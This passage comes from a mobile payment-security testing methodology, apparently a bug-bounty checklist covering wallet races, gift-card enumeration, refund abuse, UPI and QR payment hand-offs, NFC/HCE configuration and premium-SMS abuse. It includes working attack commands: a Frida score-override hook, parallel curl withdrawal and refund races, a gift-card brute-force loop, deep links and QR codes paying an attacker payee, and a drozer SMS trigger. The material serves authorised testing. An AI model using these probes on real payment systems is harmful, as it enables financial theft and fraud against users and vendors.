  Also check the *earn* side: a client-reported score, step count, watch time or game result that the
  server converts to points is the same bug from the other end.
```javascript
Java.perform(function() {
  var G = Java.use("com.target.app.Game");
  G.setScore.implementation = function (s) { console.log("[+] old " + s); return this.setScore(1000000); };
});
```
- **Proof:** The balance increasing after a negative redemption, or the sum of successful redemptions
  exceeding the starting balance — before/after balance reads and the count of 200s.
- **Escalation:** If points convert to cash or wallet balance, re-rate as direct financial theft and go to
  D23-048. -> D19 for the framework-specific score hooks.
- **Ruled out when:** Negative and over-balance values are refused with field-scoped errors, fractional
  input is normalised without creating value, and the concurrent run debits exactly once. Show the four
  balance reads.

### D23-047 · Gift card and stored value: balance-check oracle, enumeration, and the double-burn

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269); the concurrent burn is `server_security_misconfiguration\|race_condition` (**VARIES**) |
| **Attacker** | AM-01, frequently unauthenticated |
| **Applies to** | apps selling or accepting gift cards, vouchers or stored-value codes |
| **Maps to** | H1 **#759247** (redeeming gift cards multiple times); WSTG-BUSL-05; API6:2023 |

- **Test:** "Check balance" and "redeem" are usually unauthenticated or lightly authenticated and return
  different responses for valid-but-redeemed versus non-existent codes — an enumeration oracle against a
  small keyspace, on top of stored value, which is money.
- **How:**
```bash
# the differential
curl -s -X POST https://api.target/v1/giftcards/check -d '{"code":"AAAA-AAAA-AAAA"}' -i | head -5
curl -s -X POST https://api.target/v1/giftcards/check -d '{"code":"<known valid>"}'   -i | head -5
# keyspace and throttle, counted
seq 1 500 | xargs -P25 -I{} curl -s -o /dev/null -w '%{http_code} %{time_total}\n' \
  -X POST https://api.target/v1/giftcards/check -d "{\"code\":\"TEST-{}-0000\"}" | tee /tmp/gc.out | sort | uniq -c
wc -l /tmp/gc.out
# then the burn, twice and in parallel, against a card you own
```
- **Proof:** A measurable response difference (status, body, or timing) distinguishing valid codes, a
  500-of-500 success rate showing no throttle, and one code you discovered with its balance. For the
  double-burn, the goods received twice against a single card's value.
- **Escalation:** Pair the oracle with D23-045 to burn a discovered balance before its owner does — that
  pairing is what turns "an oracle exists" into a demonstrated theft.
- **Ruled out when:** Invalid, valid-unused and valid-used codes are indistinguishable in status, body
  length and timing (n ≥ 10 interleaved trials per group, means within 2σ), **and** the throttle engages
  within the 500-request run. A single slow response is jitter, not an oracle.

### D23-048 · Wallet, payout and withdrawal races and limit overruns

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_security_misconfiguration\|race_condition` (**VARIES**); argued **P1** on the settled delta |
| **Attacker** | AM-01 |
| **Applies to** | all wallet, payout and fintech apps. Keep amounts trivial, fund the balance yourself, and restore state |
| **Maps to** | PortSwigger *Smashing the state machine* — limit overrun; WSTG-BUSL-05; disclosed: double payout via mishandled payment-provider transaction states — withdrawing money without the funds being deducted (H1 **#307239**, $10,000); modifying in-flight data to generate wallet balance (H1 **#1295844**, $7,500) |

- **Test:** The mobile-specific version of the classic overdraft race, hitting endpoints (in-app top-up,
  instant payout, points burn) the web app may not even have. Then the non-race half: min, max, daily and
  monthly limits, and withdrawal without re-authentication.
- **How:**
```bash
W=https://api.target/v1/wallet/withdraw
curl -s https://api.target/v1/wallet/balance -H "Authorization: Bearer $T"      # before
for i in $(seq 1 10); do curl -s -o /dev/null -w '%{http_code} ' -X POST "$W" \
  -H "Authorization: Bearer $T" -d '{"amount":10}'; done; echo                   # sequential baseline
curl -s https://api.target/v1/wallet/balance -H "Authorization: Bearer $T"      # after baseline
# parallel: Burp single-packet group, or:
seq 1 30 | xargs -P30 -I{} curl -s -o /dev/null -w '%{http_code}\n' -X POST "$W" \
  -H "Authorization: Bearer $T" -d '{"amount":10}' | sort | uniq -c
curl -s https://api.target/v1/wallet/balance -H "Authorization: Bearer $T"      # after parallel
# limits
for a in -100 0 0.001 99999999 1e9; do curl -s -o /dev/null -w "$a:%{http_code} " -X POST "$W" \
  -H "Authorization: Bearer $T" -d "{\"amount\":$a}"; done; echo
```
- **Proof:** Total withdrawn exceeding the funded balance, read back from the wallet endpoint **and** from
  the transaction ledger, with the arithmetic written out. Or a settled transaction above the documented
  daily limit. If the ledger *records* the over-withdrawal rather than rejecting it, say so — the vendor's
  own reconciliation will not catch it either.
- **Escalation:** Terminal. This is the highest-payout class in a fintech engagement. Pair with D23-057
  (the deep-link trigger) for a one-click victim-side variant.
- **Ruled out when:** The parallel run debits exactly the sum of its successes, the balance never goes
  negative, and out-of-limit amounts are refused. Include the three balance reads (before, after
  sequential, after parallel) — two are not enough to separate a race from a logic bug.

### D23-049 · Refund and cancellation races, and refund-after-fulfilment

| | |
|---|---|
| **Severity ceiling** | Critical when value is extracted twice; High for a single duplicated refund |
| **VRT** | `server_security_misconfiguration\|race_condition` (**VARIES**) |
| **Attacker** | AM-01 |
| **Applies to** | all commerce apps with a self-service refund or cancellation |
| **Maps to** | WSTG-BUSL-06; API6:2023; the `paid -> refunded while goods remain delivered` transition |

- **Test:** Refund an order twice, cancel after fulfilment, and race a refund against the fulfilment job.
- **How:**
```bash
seq 1 20 | xargs -P20 -I{} curl -s -o /dev/null -w '%{http_code}\n' -X POST \
  https://api.target/v1/orders/$O/refund -H "Authorization: Bearer $T" | sort | uniq -c
curl -s https://api.target/v1/orders/$O -H "Authorization: Bearer $T" | jq '.status,.refunds'
curl -s https://api.target/v1/wallet/balance -H "Authorization: Bearer $T"
# sequence manipulation: call fulfil and refund out of order
curl -i -X POST https://api.target/v1/orders/$O/fulfill -H "Authorization: Bearer $T"
curl -i -X POST https://api.target/v1/orders/$O/refund  -H "Authorization: Bearer $T"
```
- **Proof:** The final ledger showing net value extracted — two refund entries for one payment, or a
  refund settled while the digital good remains accessible. Pull it from the server, not the app.
- **Escalation:** -> D23-012 (does the entitlement survive?), -> D23-045 for the method.
- **Ruled out when:** The second refund is refused with a state error, the parallel run yields exactly one
  refund entry, and the fulfilled good is revoked on refund. Show the order's refund array.

### D23-050 · GraphQL alias batching misread as a race — the false-positive gate

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (a kill gate for a claim that would otherwise be filed as `server_security_misconfiguration\|race_condition`) |
| **Attacker** | n/a |
| **Applies to** | any payments backend fronted by GraphQL |
| **Maps to** | the FP gate in the business-logic corpus: most reference implementations (Apollo, GraphQL-Ruby, Graphene) resolve aliases **sequentially** within one request |

- **Test:** 100 aliases of `redeemCoupon` all returning `success:true` is commonly misreported as a
  double-spend race. It is usually neither a race nor a double-spend.
- **How:**
```graphql
mutation { a1: redeemCoupon(code:"X"){ok} a2: redeemCoupon(code:"X"){ok} ... a100: redeemCoupon(code:"X"){ok} }
```
  Then check the **server state**, not the response:
```bash
curl -s https://api.target/graphql -H "Authorization: Bearer $T" \
  -d '{"query":"{me{wallet{balance} coupons{code appliedAt}}}"}' | jq .
```
- **Proof:** If the balance actually moved 100×, it is a **quota-enforcement** bug and should be framed
  that way (the defence is a unique constraint, not a lock). If it did not, there is nothing to file. For
  a true race, use parallel HTTP over separate TCP connections (single-packet), not aliases.
- **Escalation:** -> D23-045 if the state effect is real.
- **Ruled out when:** The aliased mutation returns N successes but the ledger shows one application.
  Record the ledger read next to the response so the negative is legible.

### D23-051 · Multi-step money flows where one step is unauthorised

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control\|idor\|modify_view_sensitive_information_iterable_object_identifiers` (**P1**) where a step reaches another user's object |
| **Attacker** | AM-05 |
| **Applies to** | in-app wallets, gift/red-packet features, P2P transfers, split bills, escrow |
| **Maps to** | H1 **#753280** (Razer — "Multiple vulnerabilities chained to allow 'RedPacket' money to be stolen by a 3rd party", **$1,000**), **#757095** (**$1,000**), **#754044** (IDOR on the same feature's logs, **$500**); API5:2023 |

- **Test:** These features chain several API calls, and the authorisation is usually checked only at the
  step the UI makes you start from. Test each call independently with a session that should not reach it.
- **How:** Enumerate every call in the flow from the proxy log, then for each one run four probes:
```bash
# 1. replay with a second user's session
curl -i -X POST https://api.target/v1/redpacket/$ID/claim -H "Authorization: Bearer $B"
# 2. replay out of order (a later step first)
curl -i -X POST https://api.target/v1/redpacket/$ID/settle -H "Authorization: Bearer $B"
# 3. replay twice
# 4. replay with another user's object id
curl -i -X POST https://api.target/v1/redpacket/$OTHERS_ID/claim -H "Authorization: Bearer $B"
# negative control: a non-existent id
curl -i -X POST https://api.target/v1/redpacket/000000/claim -H "Authorization: Bearer $B"
```
- **Proof:** Funds moving to an account that did not participate in the flow — B's balance before and
  after, A's balance before and after, and the ledger entry naming both.
- **Escalation:** -> D15 for the BOLA sweep across the rest of the API; this item is the money-shaped
  slice of it.
- **Ruled out when:** Every step rejects a foreign session and a foreign object id with an ownership
  error, while the same request under the owner's session succeeds in the same window, and the
  non-existent id returns a different status from the foreign one. Keep all four captures per step.

### D23-052 · Payment-app hand-off: UPI, wallet and bank-app deep links

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control\|exposed_sensitive_android_intent` (**VARIES**, CWE-927); the completed transfer is `broken_authentication_and_session_management\|authentication_bypass` (**P1**) |
| **Attacker** | AM-02 remote one click; AM-03 locally |
| **Applies to** | apps that construct or consume payment URIs (`upi://pay?...`, wallet schemes, bank-app schemes) and apps that register an intent-filter for them. **targetSdk < 30** gives free package visibility, which makes discovering the installed handler trivial |
| **Maps to** | CWE-927; `risks/unsafe-use-of-deeplinks`; disclosed calibration: a "send all" transaction reachable from a `tx_amount=(all)` URI (H1 **#3648638**, Medium 6.5) |

- **Test:** Three separate questions, and they are different bugs. (1) Does the app **emit** a payment URI
  whose payee or amount an external input can control? (2) Does the app **accept** a payment URI and act
  on it without a confirmation screen? (3) Is the intent-filter for the payment scheme claimable by
  another app, so a hostile handler sees or alters the transaction?
- **How:**
```bash
grep -rnE 'upi://|"pa"|"pn"|"am"|"tn"|"tr"|"mc"|"cu"|Uri\.parse\(.*pay|ACTION_VIEW.*pay|
createChooser|setPackage\(.*(gpay|phonepe|paytm|bhim)' jadx_out/sources -A6
grep -n -A12 '<data android:scheme' out/AndroidManifest.xml | grep -iE 'upi|pay|wallet|bank'
adb shell dumpsys package d | sed -n '/upi/,/^$/p'                 # who else claims the scheme
# emit side: can an external input reach the payee/amount?
adb shell am start -a android.intent.action.VIEW \
  -d 'targetapp://pay?payee=attacker@upi&amount=5000&note=x'
# consume side: does it debit without a confirmation screen?
adb shell am start -a android.intent.action.VIEW \
  -d 'upi://pay?pa=attacker@upi&pn=Attacker&am=1.00&cu=INR&tn=test'
```
- **Proof:** A screen recording of the flow: the external input, the screen sequence, and the debit — with
  the API transcript showing whether a confirmation request ever went out. For the claimable-filter
  variant, `dumpsys package d` showing two resolvers with your decoy winning.
- **Escalation:** -> D09 (deep links), -> D23-053 (the missing-confirmation shape generally), -> D23-054
  (the prompt says one payee and the transaction contains another).
- **Ruled out when:** Every externally supplied payee and amount lands on a confirmation screen the user
  must approve, the confirmed values are the ones transmitted (compare the screen against the request),
  and the scheme is handled by a verified App Link or an explicit package rather than an implicit
  resolution. Show the confirmation screen and the matching request body.

### D23-053 · Transaction executed without confirmation from a scanned or external input

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management\|authentication_bypass` (**P1**) |
| **Attacker** | AM-02 (a poisoned QR code in the physical world, or a link) |
| **Applies to** | payment apps with QR, NFC tag or deep-link initiated payments |
| **Maps to** | H1 **#126784** ("Sending payments via QR code does not require confirmation"); MASWE-0040; MASWE-0025 |

- **Test:** Generate a payment QR encoding an attacker payee and amount, scan it in the app, and record
  whether a confirmation screen appears **before** the debit. Repeat for the NFC-tag and deep-link
  equivalents.
- **How:**
```bash
qrencode -o poc.png 'upi://pay?pa=attacker@upi&pn=Merchant&am=100.00&cu=INR&tn=invoice'
adb shell screenrecord --time-limit 60 /sdcard/qr.mp4 &
# scan poc.png displayed on a second screen, then:
adb pull /sdcard/qr.mp4
```
  Also test the amount field being **absent** from the QR (the app may default it) and the amount being
  `0`, negative, or very large.
- **Proof:** The recording showing scan -> funds moved with no confirmation, and the API transcript showing
  a single request with no interstitial.
- **Escalation:** Mass fraud via poisoned QR codes in the physical world — state that impact explicitly,
  because it is what separates this from a UX complaint.
- **Ruled out when:** Every scanned payment lands on a confirmation screen showing the payee and amount
  from the code, and dismissing it leaves the balance unchanged. Record the balance before and after the
  dismissal.

### D23-054 · The confirmation prompt does not name the counterparty or amount that will execute

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-02 |
| **Applies to** | wallets, payment apps, and any app whose consent prompt names a counterparty |
| **Maps to** | H1 **#1751333** (MetaMask — confirmation attributing a request to a trusted origin, **High 7.1**), **#1941767** (Medium 4.7); MASWE-0025 (Lack of Non-Repudiation for Critical Actions) |

- **Test:** Compare, field by field, what the prompt displays against what the transaction body contains.
  An origin-spoof (D10) or a URI-parsing gap (D09) chained into the prompt is the usual delivery.
- **How:** Drive the flow with a payee/origin you control, screenshot the prompt, then capture the request
  the confirm button produces and diff the two:
```bash
adb exec-out screencap -p > prompt.png
# capture the confirm request in the proxy, then:
jq '{payee:.payee, amount:.amount, origin:.origin, memo:.memo}' confirm.json
```
  Test the parsing edges that produce the mismatch: a payee name containing the trusted name, a userinfo
  segment (`https://trusted@attacker.example`), unicode look-alikes, and an amount rendered with a
  different decimal separator.
- **Proof:** The prompt screenshot beside the executed transaction's server record, with the differing
  field circled. Two artefacts, one sentence.
- **Escalation:** -> D10 (origin spoofing), -> D09 (URI parsing), -> D23-052.
- **Ruled out when:** Every displayed field is derived from the same parsed structure that is transmitted,
  and the parsing edges above all render the attacker value rather than the trusted one. Show three edge
  cases rendering correctly.

### D23-055 · Payment confirmation under edge-to-edge and predictive back

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) where a transaction exists server-side with no confirmation; otherwise a UI defect |
| **Attacker** | AM-01 (the victim is the user; the defect is the app's) |
| **Applies to** | **targetSdk 35+** (edge-to-edge is enforced by default) and **targetSdk 36+** (predictive back default) — state the level |
| **Maps to** | Android 15 behaviour changes (edge-to-edge enforced); Android 16 behaviour changes (predictive back default); MASWE-0025 |

- **Test:** Two platform defaults that developers have not re-tested their payment screens against. Is the
  amount or recipient clipped behind the system bars at targetSdk 35+, and does a predictive-back swipe
  abandon the flow **after** the server call but **before** the confirmation renders?
- **How:** Drive the flow on Android 15/16 with gesture navigation, screenshotting each step, and correlate
  against the server-side transaction log:
```bash
adb shell wm density; adb shell settings put secure navigation_mode 2   # gesture nav
adb shell screenrecord --time-limit 60 /sdcard/back.mp4 &
# perform a back-swipe at each step of the payment flow
adb shell input swipe 0 800 400 800 100
curl -s "https://api.target/v1/transactions?limit=5" -H "Authorization: Bearer $T" | jq '.[0]'
```
- **Proof:** A server-side transaction created while the client UI was dismissed by a back swipe with no
  confirmation shown, or a confirmation screen whose amount is clipped behind a system bar — the
  screenshot plus the transaction record.
- **Escalation:** -> D04 (UI/task surface), -> D15 transaction-state inconsistency.
- **Ruled out when:** The insets are applied so the amount and payee are fully visible at targetSdk 35+,
  and an abandoned flow leaves no server-side transaction (the read-back shows nothing created). Test at
  the exact targetSdk the release ships.

### D23-056 · Shadow API: the app's billing endpoints are an older API version than the web

| | |
|---|---|
| **Severity ceiling** | Critical (old version bypasses auth entirely) / High (accepts payloads the current version validates) / Medium–High (rate-limit or field-exposure regression). **A version difference alone is Informational** |
| **VRT** | rate on the regression found: `broken_authentication_and_session_management\|authentication_bypass` (**P1**), `broken_access_control\|idor\|*`, or `server_security_misconfiguration\|race_condition` (**VARIES**) |
| **Attacker** | AM-01 |
| **Applies to** | any versioned API — and a mobile build is the number-one source of old-version endpoints |
| **Maps to** | the shadow/zombie-API method (behavioural diff, not response-shape diff); API9:2023-class improper inventory management, filed on the regression |

- **Test:** The hardcoded backend calls in an APK are frequently an **older** API version than the current
  web app uses, with weaker auth, weaker rate limits, weaker input validation and more field exposure.
  Diff **behaviourally** across versions for the *same operation* — the bug is the delta, not the
  existence of the old path. This is the highest-value mobile-to-backend bridge there is, and the billing
  endpoints are the ones worth diffing first.
- **How:**
```bash
# 1. what version does the app call?
grep -rnoE 'https?://[A-Za-z0-9.\-]+/(api/)?(v[0-9]+|beta|legacy|internal)/[A-Za-z0-9/_\-]*' jadx_out/sources | sort -u
# 2. which other versions are live?
for v in v1 v2 v3 v4 beta alpha internal legacy old 2022-01-01 2023-01-01 2024-01-01; do
  curl -s -o /dev/null -w "%{http_code} /api/$v/billing/verify\n" "https://$TARGET/api/$v/billing/verify"
done
curl -s -H 'X-API-Version: 1' https://$TARGET/api/billing/verify -o /dev/null -w '%{http_code}\n'
curl -s -H 'Accept: application/vnd.target.v1+json' https://$TARGET/api/billing/verify -o /dev/null -w '%{http_code}\n'
for sub in api api-v1 apiv1 legacy-api old-api internal-api staging-api; do
  curl -s -o /dev/null -w "%{http_code} $sub\n" "https://$sub.$TARGET/"
done
```
  Then diff four security-relevant behaviours between the old and current paths for the same operation:
  **auth strength** (does v1 accept no token, an expired token, or a lower-privilege token that v2
  rejects?), **rate limiting** (burst both; a missing 429 on v1 means throttling was never backported),
  **input validation** (the same negative amount and the same oversized payload to both), **field
  exposure** (does v1 return internal ids or PII the current version redacted?).
- **Proof:** A security regression on the old path, demonstrated with the **same request** against both
  versions side by side — for example `POST /api/v1/billing/verify` accepting a replayed `purchaseToken`
  that `/api/v3/billing/verify` rejects.
- **Escalation:** -> D15 for the general sweep; treat **every** APK-sourced endpoint as a version-diff
  candidate, not just the billing ones.
- **Ruled out when:** Only the current version resolves (everything else is 404 or connection-refused), or
  the older version proxies to the same handler and all four behavioural diffs are identical. A static
  "this version is deprecated" 200 is not a live old version — check that the operation actually executes.

### D23-057 · The layer-ordering trap on a billing or payment endpoint

| | |
|---|---|
| **Severity ceiling** | Support (it prevents a false Critical against production financial infrastructure) |
| **VRT** | n/a (a kill gate for `broken_authentication_and_session_management\|authentication_bypass`) |
| **Attacker** | n/a |
| **Applies to** | every auth-bypass claim made against a payment, billing or wallet route |
| **Maps to** | the layer-ordering trap in the triage-validation corpus — the highest-confidence false positive in the whole auth-bypass class |

- **Test:** A `400 "field X is required"` from an unauthenticated request does **not** prove you passed
  auth. Many stacks run a body parser, schema filter or sanitiser **in front of** the auth middleware, so
  a malformed body is rejected before auth is consulted and the response is indistinguishable from
  "authenticated, validation failed". The same applies at the edge: a WAF/CDN block is not an origin
  response.
- **How:** Re-send with a minimal **well-formed** body before claiming anything.
```bash
curl -s -X POST https://api.target/v1/billing/verify -d '{'
# 400 {"code":"ERR-INPUT-0001","message":"Invalid text. Only permitted characters are allowed"}   <- parser
curl -s -X POST https://api.target/v1/billing/verify -H 'Content-Type: application/json' -d '{}'
# 401 {"code":"ERR-AUTH-0001","message":"Not authenticated. Please log in."}                      <- auth layer
```
  Establish a **control** first: send an unauthenticated request to a route you know is gated on the same
  stack and record the rejection shape. A sibling route group on the same host is the ideal control.
- **Proof:** Only the second response tells you where the auth layer sits. If the error text is about
  **input shape or character class**, you are talking to a parser. If it names a **domain field**
  (`purchaseToken is required`) *and* a well-formed `{}` still returns it, that is real signal — and the
  mandatory-field names are themselves worth reading: `is_admin`, `is_internal`, `account_type`,
  `merchant_id` in a mandatory-field list means authorisation is derived from client-supplied parameters.
- **Escalation:** Where the signal is real, -> D23-056 (is the unauthenticated route an old version?) and
  -> D15 for the unauthenticated route sweep across every APK-derived endpoint.
- **Ruled out when:** The well-formed `{}` returns an auth-layer error while the malformed body returned a
  parser error. Record both, and never claim an auth bypass on the strength of a validation message alone.

### D23-058 · Card data persisted, logged or left in memory on the device

| | |
|---|---|
| **Severity ceiling** | High (PCI-relevant and a direct fraud enabler). The bare-storage node is `insecure_data_storage\|sensitive_application_data_stored_unencrypted\|on_internal_storage` (**P5**) — do not file it there |
| **VRT** | `sensitive_data_exposure\|disclosure_of_secrets\|pii_leakage_exposure` (**VARIES**, CWE-200) for the exposure; `insecure_data_storage\|sensitive_application_data_stored_unencrypted\|on_external_storage` (**P4**) if it lands on shared storage |
| **Attacker** | AM-11 physical unlocked, AM-04 for the logcat/shared-storage routes on older API levels |
| **Applies to** | all payment apps |
| **Maps to** | CWE-312; MASTG-TECH-0009 (system log inspection); MASTG-TECH-0008 |

- **Test:** Whether the PAN, CVV or expiry is stored, logged, autocompleted, screenshot-able or left in
  process memory after the payment screen is dismissed. Run it with a **PSP test PAN**, never a real card.
- **How:**
```bash
P=com.target.app
adb logcat -c    # clear first, then drive the payment screen
grep -rn 'cardNumber\|cvv\|cvc\|expiry\|\bpan\b' jadx_out/sources | head -40
grep -rn 'autofillHints\|importantForAutofill\|inputType' jadx_out/res/layout/*.xml | grep -i card
adb logcat -d | grep -E '[0-9]{13,19}'
adb shell "su 0 find /data/data/$P -type f -newermt '-10 minutes'" | while read f; do
  adb shell "su 0 strings '$f'" | grep -E '\b[0-9]{13,19}\b'; done
# Luhn-check anything that matches before claiming it is a PAN
```
- **Proof:** The test PAN or CVV recovered from logcat, a preferences file, the clipboard, a screenshot,
  a WAL/journal residue, or process memory after the screen was dismissed — with the value Luhn-validated
  so the triager knows it is a card number and not a random digit run.
- **Escalation:** -> D11/D20. The session-replay variant is the more damaging one: if UXCam, Smartlook,
  Clarity, FullStory or Quantum Metric is present and the card screen is not masked, the PAN and CVV are
  in a third party's dashboard — grep for `occludeSensitiveView|setSensitive|maskView|FS.privacy` and
  prove it from the uploaded payload or the vendor replay.
- **Ruled out when:** A full sweep after driving the saved-cards and payment screens finds **no
  Luhn-valid PAN-shaped runs, no card field names in any store, and no `strings` hits in the databases**
  — and you say so as a verified negative with the probes listed. That negative is what makes the token
  finding credible; report it.

### D23-059 · NFC Observe Mode and polling-frame handling — pre-authentication emission

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure\|disclosure_of_secrets\|pii_leakage_exposure` (**VARIES**, CWE-200) for the emitted identifier; `broken_access_control\|privilege_escalation` (**VARIES**) where the app acts on the frame |
| **Attacker** | AM-10 physical locked (a reader presented to a locked device) |
| **Applies to** | **Android 15+ HCE apps** — `NfcAdapter.setObserveModeEnabled()`, `HostApduService.processPollingFrames()`, `CardEmulation.registerPollingLoopPatternFilterForService()` |
| **Maps to** | Android 15 features documentation (Observe Mode, polling-frame pre-authentication, polling-loop pattern filters) |

- **Test:** Android 15 lets an app listen to a reader's polling frames without responding, and act on them
  **before** any user authentication. Test what the app does in that pre-auth window: does it select an
  AID, emit a card identifier, or decide to authenticate automatically?
- **How:**
```bash
grep -rn 'setObserveModeEnabled\|processPollingFrames\|registerPollingLoopPatternFilterForService\|PollingFrame' jadx_out/sources -A8
adb shell dumpsys nfc | grep -iE 'observe|polling|routing|AID'
```
  Present a reader (or an NFC emulator) against a locked device and capture the APDU exchange.
- **Proof:** An APDU response or an identifier emitted while the device is locked, or before biometric
  confirmation — the captured exchange with the lock state visible.
- **Escalation:** -> D23-061 (relay), and to skimming: pre-authentication emission is the enabler for
  both.
- **Ruled out when:** Observe Mode is enabled and the service emits nothing until the device is unlocked
  and the user has authenticated — shown by the captured exchange containing no response frames in the
  locked state.

### D23-060 · Wallet role versus the legacy default-payment assumption

| | |
|---|---|
| **Severity ceiling** | High (Medium where the app merely mis-states which handler will transact; High where it acts on the assumption) |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-03 local app that holds or acquires the role |
| **Applies to** | **Android 15+** — the Wallet role replaces the old NFC default contactless payment setting and routes payment AIDs to the role holder |
| **Maps to** | Android 15 features documentation ("New system role replacing NFC default contactless payment setting. Routes NFC payment AIDs to the Wallet role holder. Users manage via Settings > Apps > Default Apps") |

- **Test:** An app that assumes it is the default payment handler because of the legacy setting, or that
  does not handle losing the role, can be shadowed by whichever app holds the Wallet role.
- **How:**
```bash
adb shell cmd role get-role-holders android.app.role.WALLET
adb shell dumpsys nfc | grep -i 'preferred\|default\|wallet'
grep -rn 'ROLE_WALLET\|isDefaultServiceForCategory\|CardEmulation\|setPreferredService' jadx_out/sources -A6
```
- **Proof:** The target app still presenting itself as the payment handler in its own UI while
  `cmd role get-role-holders` names a different package — user-visible ambiguity about which app will
  transact, screenshotted beside the command output.
- **Escalation:** Escalates where the app performs an action on the assumption that it will receive the
  tap (pre-authorising, reserving funds, marking a transaction started). -> D23-061.
- **Ruled out when:** The app queries the role holder and degrades correctly — it tells the user it is not
  the default handler and takes no pre-emptive action. Demonstrate by granting the role to another app and
  observing the UI change.

### D23-061 · HCE service configuration: AID registration, `requireDeviceUnlock` and relay exposure

| | |
|---|---|
| **Severity ceiling** | Critical for payment or access-control credentials |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269); `sensitive_data_exposure\|disclosure_of_secrets\|pii_leakage_exposure` (**VARIES**) for harvested card data |
| **Attacker** | AM-10 physical locked for the relay/skim case; AM-03 for a competing registration |
| **Applies to** | wallet, transit, access-control and loyalty apps with an HCE service |
| **Maps to** | `risks/insecure-machine-to-machine` (NFC cloned intent-filters; mitigation `NdefRecord.createApplicationRecord()` / Android Application Records; and "Lack of NDEF Message Validation" — validate TNF, record structure and magic bytes before dispatch); the EMV relay research summarised in the corpus (PPSE `325041592E5359532E4444463031` = `2PAY.SYS.DDF01`; EMV AIDs `A0000000031010`, `A0000000041010`, `A00000002501`) |

- **Test:** Three checks against the app's own configuration. Does the AID service set
  `android:requireDeviceUnlock="false"` (widening the window in which it answers)? Does
  `processCommandApdu` validate the APDU before acting? Can a competing app claim the same NFC
  intent-filter or AID?
- **How:**
```bash
grep -n 'HostApduService\|android.nfc.cardemulation\|BIND_NFC_SERVICE' out/AndroidManifest.xml -A8
cat out/res/xml/apduservice.xml 2>/dev/null      # category="payment", requireDeviceUnlock, AID list
grep -rn 'processCommandApdu' jadx_out/sources -A25
grep -rn 'NdefRecord\|NdefMessage\|createApplicationRecord\|getTnf\|getType' jadx_out/sources -B4 -A8
adb shell dumpsys nfc | sed -n '/AID/,/^$/p'
```
- **Proof:** A malformed or replayed APDU accepted by `processCommandApdu` producing a privileged response
  (transcript of the exchange), or `dumpsys nfc` showing a competing app winning the same AID/tag type.
  For the configuration half, quote `requireDeviceUnlock="false"` from `apduservice.xml`.
- **Escalation:** Only the app holding the payment role answers `payment`-category AIDs — that precondition
  is what separates a real relay exposure from a theoretical one, so state it. -> D23-060.
- **Ruled out when:** `requireDeviceUnlock="true"`, `processCommandApdu` validates the CLA/INS/AID and
  length before dispatch and returns `6D00`/`6A82` otherwise, and no competing registration resolves ahead
  of the app. Show the rejection transcript.

### D23-062 · Billable action reachable from an exported surface with no user consent

| | |
|---|---|
| **Severity ceiling** | Critical when silent and repeatable; High otherwise |
| **VRT** | `broken_access_control\|exposed_sensitive_android_intent` (**VARIES**, CWE-927); `sensitive_data_exposure\|disclosure_of_secrets\|pay_per_use_abuse` (**P4**) where the abused resource is a metered third-party service rather than the user's own bill |
| **Attacker** | AM-03 zero-permission local app (the confused deputy holds the permission, not the attacker) |
| **Applies to** | apps holding `SEND_SMS`, `CALL_PHONE`, or any entitlement/credit-consuming action reachable by IPC |
| **Maps to** | ATT&CK **T1643** Generate Traffic from Victim (on Android `SEND_SMS` "is required, and user consent is necessary for premium-rate SMS recipients"; MazarBOT "can send messages to premium-rate numbers"; Judy "uses infected devices to generate fraudulent clicks on advertisements"), **T1582** SMS Control, **T1616** Call Control, T1660; CVE-2025-12080 (intent injection) |

- **Test:** Any exported surface that sends SMS/MMS, dials, consumes an entitlement, or triggers a
  premium-rate action is a fraud finding, not merely an IPC finding. The attacker app holds no permission;
  the target does.
- **How:**
```bash
aapt2 dump permissions base.apk | grep -E 'SEND_SMS|CALL_PHONE|READ_PHONE_STATE'
grep -rn 'SmsManager.getDefault|sendTextMessage|sendMultipartTextMessage|ACTION_CALL|Intent.ACTION_SENDTO' jadx_out/sources -B6
# can the destination come from outside?
grep -rn -B8 'sendTextMessage(' jadx_out/sources | grep -iE 'getIntent|getQueryParameter|getStringExtra|remoteConfig|fcm|onReceive'
drozer> run app.broadcast.send --component com.target.app com.target.app.SmsReceiver --extra string to "+15550001111"
adb shell am start -a android.intent.action.VIEW -d 'targetapp://sms?to=%2B15550001111&body=x'
```
- **Proof:** The billable action completing with the calling app holding **no** relevant permission and
  the user shown no confirmation — the received SMS on a number you own, or the call in `dumpsys telecom`,
  plus the attacker app's empty permission list.
- **Escalation:** -> D05/D08/D09 for the IPC mechanics. Aggregate impact: an attacker app installed at
  scale becomes a premium-SMS monetisation channel — say that, because it is what moves the rating.
- **Ruled out when:** The destination is fixed in code or validated against an allow-list, **and** the
  surface is unexported or permission-guarded such that an unprivileged test app receives a
  `SecurityException`. Prove it from the test app, not from `adb shell`.

### D23-063 · Rules of engagement for payment testing — the boundary, and what you must not do

| | |
|---|---|
| **Severity ceiling** | Support (it governs whether the rest of the chapter is testable at all) |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | every engagement that touches a payment surface |
| **Maps to** | HackerOne Platform Standards on leaked credentials — "should NOT test their validity beyond authenticating and then immediately deauthenticating"; NIST SP 800-115 Appendix B §1.2 (Scope), §1.3 (Assumptions and Limitations) |

- **Test:** Settle in writing, before Gate 1: sandbox PSP keys? test cards? is any real card or real
  settlement in scope (default: **no**)? who provisions the KYC-complete, funded account? The answers
  determine which items below are executable and which become named coverage limitations.
- **How:** Two hard lines to hold, both from field experience rather than policy text.
```
1. NEVER submit a PAN to a tokenisation or vault endpoint to observe validation behaviour — even with the
   operator's consent, even with their own card. Submitting PANs to observe validation IS card testing
   regardless of intent. The operator's consent covers THEIR card, not the VENDOR's system; only the
